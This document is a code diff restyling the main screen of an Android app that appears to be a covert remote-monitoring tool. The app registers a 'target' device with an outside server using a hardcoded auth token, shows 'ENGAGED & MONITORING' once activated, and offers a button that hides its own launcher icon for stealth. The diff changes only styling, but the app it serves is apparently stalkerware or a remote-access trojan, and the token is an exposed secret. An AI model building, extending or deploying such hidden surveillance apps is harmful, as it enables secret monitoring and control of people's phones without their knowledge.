@@ -15,6 +15,8 @@ import androidx.core.content.ContextCompat
 import android.net.Uri
 import android.os.PowerManager
 import android.provider.Settings
+import android.graphics.Color
+import android.graphics.drawable.GradientDrawable
 
 class MainActivity : AppCompatActivity() {
 
@@ -23,12 +25,12 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Root layout
+        // Root layout - Dark Theme Futuristic
         val rootLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(64, 120, 64, 64)
             gravity = Gravity.CENTER_HORIZONTAL
-            setBackgroundColor(0xFFF5F5F5.toInt())
+            setBackgroundColor(Color.parseColor("#0F172A")) // Slate 900
             layoutParams = ViewGroup.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT,
                 ViewGroup.LayoutParams.MATCH_PARENT
@@ -37,9 +39,10 @@ class MainActivity : AppCompatActivity() {
 
         // Header
         val header = TextView(this).apply {
-            text = "Device Controller"
-            textSize = 28f
-            setTextColor(0xFF333333.toInt())
+            text = "SYSTEM MONITOR"
+            textSize = 24f
+            setTextColor(Color.parseColor("#38BDF8")) // Cyan Accent
+            letterSpacing = 0.1f
             setTypeface(null, android.graphics.Typeface.BOLD)
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 80)
@@ -49,62 +52,69 @@ class MainActivity : AppCompatActivity() {
         // Preferences for Config
         val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
 
-        // URL Input
-        val urlInput = EditText(this).apply {
-            hint = "Server URL"
-            setText(prefs.getString("ws_url", "https://pygram.xnv.biz.id"))
-            setPadding(24, 24, 24, 24)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { setMargins(0, 0, 0, 24) }
-            setBackgroundColor(0xFFFFFFFF.toInt())
+        fun createInputBox(hintText: String, defaultVal: String, marginB: Int): EditText {
+            return EditText(this).apply {
+                hint = hintText
+                setText(defaultVal)
+                setHintTextColor(Color.parseColor("#64748B"))
+                setTextColor(Color.parseColor("#F8FAFC"))
+                setPadding(40, 40, 40, 40)
+                textSize = 14f
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                ).apply { setMargins(0, 0, 0, marginB) }
+                
+                background = GradientDrawable().apply {
+                    setColor(Color.parseColor("#1E293B"))
+                    cornerRadius = 24f
+                    setStroke(2, Color.parseColor("#334155"))
+                }
+            }
         }
+
+        // Inputs
+        val urlInput = createInputBox("Server URL", prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: "", 32)
+        val authInput = createInputBox("Auth Token", prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: "", 32)
+        val idInput = createInputBox("Target Name (ID)", prefs.getString("device_id", "my_phone") ?: "", 64)
+        
         rootLayout.addView(urlInput)
-
-        // Auth Token Input
-        val authInput = EditText(this).apply {
-            hint = "Auth Token"
-            setText(prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8"))
-            setPadding(24, 24, 24, 24)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { setMargins(0, 0, 0, 24) }
-            setBackgroundColor(0xFFFFFFFF.toInt())
-        }
         rootLayout.addView(authInput)
-
-        // Device ID Input
-        val idInput = EditText(this).apply {
-            hint = "Device ID (Optional)"
-            setText(prefs.getString("device_id", "my_phone"))
-            setPadding(24, 24, 24, 24)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { setMargins(0, 0, 0, 48) }
-            setBackgroundColor(0xFFFFFFFF.toInt())
-        }
         rootLayout.addView(idInput)
 
         // Status
         val statusText = TextView(this).apply {
-            text = "Status: Service Stopped"
-            textSize = 16f
-            setPadding(0, 0, 0, 48)
+            text = "Status: INACTIVE"
+            textSize = 14f
+            setTextColor(Color.parseColor("#94A3B8"))
+            setPadding(0, 0, 0, 64)
             gravity = Gravity.CENTER
         }
         rootLayout.addView(statusText)
 
+        // Function for Buttons
+        fun createActionBtn(btnText: String, hexBg: String, hexStroke: String = ""): Button {
+            return Button(this).apply {
+                text = btnText
+                setTextColor(Color.parseColor("#F8FAFC"))
+                textSize = 14f
+                setTypeface(null, android.graphics.Typeface.BOLD)
+                setPadding(0, 44, 0, 44)
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                ).apply { setMargins(0, 24, 0, 0) }
+                
+                background = GradientDrawable().apply {
+                    setColor(Color.parseColor(hexBg))
+                    cornerRadius = 24f
+                    if (hexStroke.isNotEmpty()) setStroke(3, Color.parseColor(hexStroke))
+                }
+            }
+        }
+
         // Start Button
-        val startButton = Button(this).apply {
-            text = "START SYSTEM"
-            setPadding(0, 40, 0, 40)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
+        val startButton = createActionBtn("ACTIVATE SERVICE", "#0284C7").apply {
             setOnClickListener {
                 val url = urlInput.text.toString().trim()
                 val devId = idInput.text.toString().trim()
@@ -115,7 +125,6 @@ class MainActivity : AppCompatActivity() {
                     return@setOnClickListener
                 }
 
-                // Save Config
                 prefs.edit().apply {
                     putString("ws_url", url)
                     putString("device_id", devId)
@@ -123,21 +132,15 @@ class MainActivity : AppCompatActivity() {
                     apply()
                 }
 
-                statusText.text = "Status: Service Starting..."
+                statusText.text = "Status: ENGAGED & MONITORING"
+                statusText.setTextColor(Color.parseColor("#34D399")) // Green
                 checkAndStartService()
             }
         }
         rootLayout.addView(startButton)
 
         // Hide App Button
-        val hideButton = Button(this).apply {
-            text = "HIDE APP ICON (STEALTH)"
-            setPadding(0, 40, 0, 40)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { setMargins(0, 20, 0, 0) }
-            
+        val hideButton = createActionBtn("HIDE SYSTEM APP", "#0F172A", "#E11D48").apply {
             setOnClickListener {
                 if (Toast.makeText(this@MainActivity, "App icon will vanish now...", Toast.LENGTH_SHORT).show().run { true }) {
                     val pm = packageManager
